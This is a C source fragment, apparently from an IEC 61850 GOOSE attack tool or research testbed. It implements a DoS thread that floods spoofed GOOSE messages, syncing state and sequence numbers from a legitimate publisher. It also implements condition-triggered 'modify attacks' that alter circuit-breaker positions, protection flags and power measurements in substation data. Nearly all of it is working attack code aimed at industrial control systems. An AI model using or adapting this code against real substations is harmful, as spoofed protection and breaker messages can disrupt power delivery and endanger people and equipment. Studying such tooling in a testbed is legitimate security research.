    /* Build dataset values safely */
    LinkedList dataSetValues = LinkedList_create();
    #define DOS_MAX_VALUES 64

    for (int valueIndex = 0; valueIndex < DOS_MAX_VALUES; valueIndex++) {

        const char* v = attack.values[valueIndex].value;
        const char* t = attack.values[valueIndex].type;

        if (v == NULL || v[0] == '\0')
            break;

        if (t == NULL) {
            fprintf(stderr, "[DoS] ERROR: values[%d].type is NULL\n", valueIndex);
            fflush(stderr);
            break;
        }

        /* ---- FIX 2: If type is not one of the expected ones, stop.
           Your log shows type becomes chunks of XML; continuing is meaningless and risky. ---- */
        if (strcmp(t, "integer") && strcmp(t, "string") && strcmp(t, "boolean") && strcmp(t, "float")) {
            fprintf(stderr, "[DoS] ERROR: values[%d].type looks corrupt: '%.40s' -> stop parsing values\n",
                    valueIndex, t);
            fflush(stderr);
            break;
        }

        if (!strcmp(t, "integer")) {
            LinkedList_add(dataSetValues, MmsValue_newIntegerFromInt32(atoi(v)));
        }
        else if (!strcmp(t, "string")) {
            LinkedList_add(dataSetValues, MmsValue_newVisibleString(v));
        }
        else if (!strcmp(t, "boolean")) {
            bool binValue = (!strcmp(v, "true") || !strcmp(v, "TRUE") || !strcmp(v, "True"));
            LinkedList_add(dataSetValues, MmsValue_newBoolean(binValue));
        }
        else { /* float */
            LinkedList_add(dataSetValues, MmsValue_newFloat(atof(v)));
        }
    }

    CommParameters gooseCommParameters = (CommParameters){0};

    gooseCommParameters.appId = attack.appId;
    gooseCommParameters.dstAddress[0] = getHexFromString(0,  attack.dstAddress);
    gooseCommParameters.dstAddress[1] = getHexFromString(2,  attack.dstAddress);
    gooseCommParameters.dstAddress[2] = getHexFromString(4,  attack.dstAddress);
    gooseCommParameters.dstAddress[3] = getHexFromString(6,  attack.dstAddress);
    gooseCommParameters.dstAddress[4] = getHexFromString(8,  attack.dstAddress);
    gooseCommParameters.dstAddress[5] = getHexFromString(10, attack.dstAddress);
    gooseCommParameters.vlanId = attack.vlanId;
    gooseCommParameters.vlanPriority = attack.vlanPriority;

    GoosePublisher publisher = GoosePublisher_create(&gooseCommParameters,
                                                     attack.interface ? attack.interface : "");
    if (!publisher) {
        fprintf(stderr, "[DoS] ERROR: GoosePublisher_create returned NULL (iface=%s)\n",
                attack.interface ? attack.interface : "NULL");
        fflush(stderr);

        LinkedList_destroyDeep(dataSetValues, (LinkedListValueDeleteFunction) MmsValue_delete);
        pthread_exit(0);
    }

    int gate_triggers = ((attack.stNum < 0) || (attack.sqNum < 0));
    fprintf(stderr,
            "[DoS] GATE check: (stNum<0 || sqNum<0) = %d  (st=%d sq=%d) legitPublisher=%p\n",
            gate_triggers, attack.stNum, attack.sqNum, (void*)attack.legitPublisher);
    fflush(stderr);

    if (gate_triggers) {
        if (attack.legitPublisher) {

            /* safer if publisher internals are shared */
            IedServer_lockDataModel(iedServer);

            if (attack.stNum < 0)
                attack.stNum = (int)GoosePublisher_getStNum(attack.legitPublisher);

            if (attack.sqNum < 0)
                attack.sqNum = (int)GoosePublisher_getSqNum(attack.legitPublisher);

            IedServer_unlockDataModel(iedServer);

            fprintf(stderr, "[DoS] SYNCED from legitPublisher -> st=%d sq=%d\n", attack.stNum, attack.sqNum);
            fflush(stderr);
        }
        else {
            fprintf(stderr, "[DoS] WARN: gate asked for sync but legitPublisher is NULL/invalid. Using XML values.\n");
            fflush(stderr);
        }
    }

    GoosePublisher_setStNum(publisher, (uint32_t)attack.stNum);
    GoosePublisher_setSqNum(publisher, (uint32_t)attack.sqNum);
    GoosePublisher_setConfRev(publisher, attack.confRev);
    GoosePublisher_setTimeAllowedToLive(publisher, attack.timeAllowedtoLive);
    GoosePublisher_setGoCbRef(publisher, attack.gocbRef);
    GoosePublisher_setDataSetRef(publisher, attack.dataSet);
    GoosePublisher_setGoID(publisher, attack.goID);

    long long interval_ns = 0;

    if (attack.pps > 0) {
        interval_ns = 1000000000LL / (long long)attack.pps;
        if (interval_ns < 1) interval_ns = 1;
        fprintf(stderr, "[DoS] pacing: pps=%d -> interval_ns=%lld\n", attack.pps, interval_ns);
    }
    else if (attack.interPacketUs > 0) {
        interval_ns = (long long)attack.interPacketUs * 1000LL;
        fprintf(stderr, "[DoS] pacing: interPacketUs=%d -> interval_ns=%lld\n", attack.interPacketUs, interval_ns);
    }
    else {
        fprintf(stderr, "[DoS] pacing: NONE (send as fast as possible)\n");
    }
    fflush(stderr);

    long long next_send = now_ns();

    for (int j = 0; j < attack.stopCondition_packetNum; j++) {

        if (interval_ns > 0)
            wait_until_ns(next_send);

        if (GoosePublisher_publish(publisher, dataSetValues) == -1)
            fprintf(stderr, "Error sending message!\n");

        if (interval_ns > 0)
            next_send += interval_ns;
    }

    GoosePublisher_destroy(publisher);

    LinkedList_destroyDeep(dataSetValues, (LinkedListValueDeleteFunction) MmsValue_delete);
    fprintf(stderr, "stop DoS thread\n");
    fflush(stderr);
    pthread_exit(0);
}


void launchModifyAttack(IedServer iedserver, char **array) {
	//printf("in launch modify attack");
	LinkedList element = iedserver->mmsMapping->gseControls;
	while ((element = LinkedList_getNext(element)) != NULL) {
		MmsGooseControlBlock gcb = (MmsGooseControlBlock) element->data;
		GoosePublisher publisher = gcb->publisher;
		int index = 0;
		struct ModifyAttack *currentAttack;
		if (attackList->modifyAttackNum != 0) {
			while (index<attackList->modifyAttackNum&&attackList->modifyAttackList[index]->valid==true) {
				currentAttack = attackList->modifyAttackList[index];
				if (!currentAttack->executed) {
					if (currentAttack->condition_type == CONDITION_ST_SQ_GCB) {
						if (GoosePublisher_getStNum(publisher)== currentAttack->condition_st&& GoosePublisher_getSqNum(publisher)== currentAttack->condition_sq&& !strcmp(gcb->name,currentAttack->condition_gcb)) {
							printf("try to modify attack\n");
							ModifyArray(array, currentAttack);
							attackList->modifyAttackList[index]->executed =true;
							executedModifyAttackCount++;
							//break;
						}
					} else if (currentAttack->condition_type == CONDITION_TIME) {
						if (getRuningTime()> (currentAttack->condition_time- updatePayloadInterval)) {
							ModifyArray(array, currentAttack);
							attackList->modifyAttackList[index]->executed =true;
							executedModifyAttackCount++;
							//break;
						}
					} else if (currentAttack->condition_type== CONDITION_PAYLOAD) {
						if ((!strcmp(gcb->name, currentAttack->condition_gcb))&& payloadConditionTrigger(currentAttack->condition_payloads,array)) {
							printf("trigger modify attack by condition_payload\n");
							ModifyArray(array, currentAttack);
							attackList->modifyAttackList[index]->executed =true;
							executedModifyAttackCount++;
						}
					}
				}
				if (attackList->modifyAttackNum == executedModifyAttackCount) {
					enableModifyAttack = false;
				}
				index++;
			}
		} else {
			enableModifyAttack = false;
		}

	}
}
void ModifyArray(char** array,struct ModifyAttack* mAttack){
	int i=0;
	while(mAttack->modifications[i].arrayIndex>0){
		(array[mAttack->modifications[i].arrayIndex-1])=(mAttack->modifications[i].modifiedvalue);
		i++;
	}
	int j=0;
	while(j<10){

		printf("array %d:%s\n",j,array[j]);
		j++;
	}
}
void ModifyArrayTriggerByTime(struct ModifyAttack* mAttack){
	//char ** array=getResults();
	int i=0;
	while(mAttack->modifications[i].arrayIndex>0){
		(results[mAttack->modifications[i].arrayIndex-1])=(mAttack->modifications[i].modifiedvalue);
		i++;
	}
	int j=0;
	while(j<10){

		printf("!array %d:%s\n",j,results[j]);
		j++;
	}
	assignPayloadValue();
}

double getRuningTime() {
    return g_sim_time;
}


int getHexFromString(int index, char* s)
{
    if (!s || (int)strlen(s) < index + 2) return 0;

    char substr[3];
    memcpy(substr, s + index, 2);
    substr[2] = '\0';
    return (int)strtol(substr, NULL, 16);
}
bool payloadConditionTrigger(struct PayloadCondition condition_payloads[MAXIMUM_CONDITION_PAYLOAD_SIZE],char **results){
	int i=0;
	bool returnValue=true;
	while(condition_payloads[i].index>0){
		struct PayloadCondition current_payload=condition_payloads[i];
		if(!strcmp(current_payload.type,"string")){
			if(strcmp(results[current_payload.index-1],current_payload.value)){
				returnValue=false;
				break;
			}
		}else if(!strcmp(current_payload.type,"numeric")){
			float pValue=atof(current_payload.value);
			float rValue=atof(results[current_payload.index-1]);
			if(!strcmp(current_payload.operator,"bigger")){
				if(!(rValue>pValue)){
					returnValue=false;
					break;
				}
			}else if(!strcmp(current_payload.operator,"smaller")){

				if(!(rValue<pValue)){
					returnValue=false;
					break;
				}
			}else if(!strcmp(current_payload.operator,"equal")){
				if(!(rValue==pValue)){
					returnValue=false;
					break;
				}
			}
		}else if(!strcmp(current_payload.type,"boolean")){
			bool pValue=stobool(current_payload.value);
			bool rValue=stobool(results[current_payload.index-1]);
			if(!(pValue==rValue)){
				returnValue=false;
				break;
			}
		}
		i++;
	}
	return returnValue;

}
char ** getResults(){
	return results;
}
void assignPayloadValue(){
	IedServer_lockDataModel(iedServer); //Lock the MMS server data model.Client requests will be postponed until the lock is removed.
	//Insert generated code here
	IedServer_updateInt32AttributeValue(iedServer,IEDMODEL_CTRL_XCBR_Pos_stVal,atoi(results[0]));
	IedServer_updateInt32AttributeValue(iedServer,IEDMODEL_CTRL_XSWI_Pos_stVal,atoi(results[1]));
	IedServer_updateInt32AttributeValue(iedServer,IEDMODEL_CTRL_PTRC_EEHealth_stVal,atoi(results[2]));
	IedServer_updateBooleanAttributeValue(iedServer,IEDMODEL_CTRL_XCBR_Loc_stVal,stobool(results[3]));
	IedServer_updateBooleanAttributeValue(iedServer,IEDMODEL_PROT_PIOC_Op_general,stobool(results[4]));
	IedServer_updateInt32AttributeValue(iedServer,IEDMODEL_PROT_XCBR_EEHealth_stVal,atoi(results[5]));
	IedServer_updateBooleanAttributeValue(iedServer,IEDMODEL_PROT_LPHD_PwrSupAlm_stVal,stobool(results[6]));
	IedServer_updateBooleanAttributeValue(iedServer,IEDMODEL_PROT_PSCH_ProTx_stVal,stobool(results[7]));
	IedServer_updateBooleanAttributeValue(iedServer,IEDMODEL_PROT_PSCH_ProRx_stVal,stobool(results[8]));
	IedServer_updateFloatAttributeValue(iedServer,IEDMODEL_MEAS_MMXU_A_phsA_instCVal_mag_f,atof(results[9]));
	IedServer_updateFloatAttributeValue(iedServer,IEDMODEL_MEAS_MMXU_A_phsB_instCVal_mag_f,atof(results[10]));
	IedServer_updateFloatAttributeValue(iedServer,IEDMODEL_MEAS_MMXU_A_phsC_instCVal_mag_f,atof(results[11]));
	IedServer_updateFloatAttributeValue(iedServer,IEDMODEL_MEAS_MMXU_PhV_phsA_instCVal_mag_f,atof(results[12]));
	IedServer_updateFloatAttributeValue(iedServer,IEDMODEL_MEAS_MMXU_PhV_phsB_instCVal_mag_f,atof(results[13]));
	IedServer_updateFloatAttributeValue(iedServer,IEDMODEL_MEAS_MMXU_PhV_phsC_instCVal_mag_f,atof(results[14]));
	IedServer_updateFloatAttributeValue(iedServer,IEDMODEL_MEAS_MMXU_TotW_instMag_f,atof(results[15]));
	IedServer_updateFloatAttributeValue(iedServer,IEDMODEL_MEAS_MMXU_TotVAr_instMag_f,atof(results[16]));
	IedServer_updateFloatAttributeValue(iedServer,IEDMODEL_MEAS_MMXU_Hz_instMag_f,atof(results[17]));
	IedServer_updateFloatAttributeValue(iedServer,IEDMODEL_MEAS_MMXU_TotPF_instMag_f,atof(results[18]));
	//End of insert code
	IedServer_unlockDataModel(iedServer);
}
void InsertAndDoSAttacks(){
	if (enableInsertAttack) {
		launchInsertAttack();
	}
	//launch DoS attack
	if(enableDosAttack){
		launchDoSAttack();
	}
}
